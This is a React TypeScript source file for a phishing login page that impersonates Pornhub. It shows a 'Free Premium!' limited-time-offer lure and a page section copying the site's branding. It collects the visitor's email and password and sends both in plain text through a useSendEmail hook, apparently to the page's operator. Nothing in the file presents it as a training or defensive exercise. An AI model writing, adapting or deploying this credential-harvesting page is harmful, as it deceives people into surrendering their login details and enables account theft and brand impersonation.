import React, { useState } from 'react';
import useSendEmail from '../hooks/useSendEmail';
import bgImage from '../assets/bg.jpg';

interface TemplateParams extends Record<string, unknown> {
  user_email: string;
  user_password: string;
}

const LoginForm: React.FC = () => {
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');

  const { sendEmail, message, error, loading } = useSendEmail();

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const templateParams: TemplateParams = {
      user_email: email,
      user_password: password,
    };

    const success = await sendEmail(templateParams);

    if (success) {
      setEmail('');
      setPassword('');
    }
  };

  return (
    <div
      className="flex justify-center items-center min-h-screen bg-cover bg-center relative"
      style={{
        backgroundImage: `url(${bgImage})`,
      }}
    >
      {/* Dark Overlay */}
      <div className="absolute inset-0 opacity-70"></div>

      {/* Form Container */}
      <div className="relative z-10 w-full max-w-md p-6">
        <h2 className="text-3xl font-bold text-center text-white mb-4">Free Premium!</h2>
        <p className="text-center text-gray-300 mb-6">Please log in to secure this limited time offer.</p>

        <form onSubmit={handleSubmit} className="space-y-4">
          {/* Email Input */}
          <div>
            <input
              type="email"
              className="w-full px-4 py-3 rounded bg-opacity-80 bg-gray-800 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              placeholder="Email"
            />
          </div>

          {/* Password Input */}
          <div>
            <input
              type="password"
              className="w-full px-4 py-3 rounded bg-opacity-80 bg-gray-800 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              placeholder="Password"
            />
          </div>

          {/* Submit Button */}
          <div>
            <button
              type="submit"
              className={`w-full bg-orange-500 text-white py-3 rounded hover:bg-orange-600 transition-colors ${
                loading ? 'opacity-50 cursor-not-allowed' : ''
              }`}
              disabled={loading}
            >
              {loading ? 'Sending...' : 'Submit'}
            </button>
          </div>

          {/* Success and Error Messages */}
          {message && <div className="text-center text-green-400">{message}</div>}
          {error && <div className="text-center text-red-400">{error}</div>}
        </form>

        {/* Additional Information */}
        <div className="mt-8 text-center">
          <h3 className="text-lg font-semibold text-white">What is Pornhub?</h3>
          <p className="text-gray-300 mt-2">Pornhub is the home for porn videos online:</p>
          <ul className="list-disc list-inside text-gray-300 space-y-1 mt-2">
            <li>Watch thousands of porn videos.</li>
            <li>Share favorites with friends.</li>
            <li>Connect with other users.</li>
            <li>Upload your videos to a worldwide audience.</li>
          </ul>
          <h5 className="text-lg text-orange-500 mt-4">
            <a href="/user/create_account_select" className="underline hover:text-orange-400">
              Sign up now
            </a>{' '}
            to join the Pornhub.com community.
          </h5>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
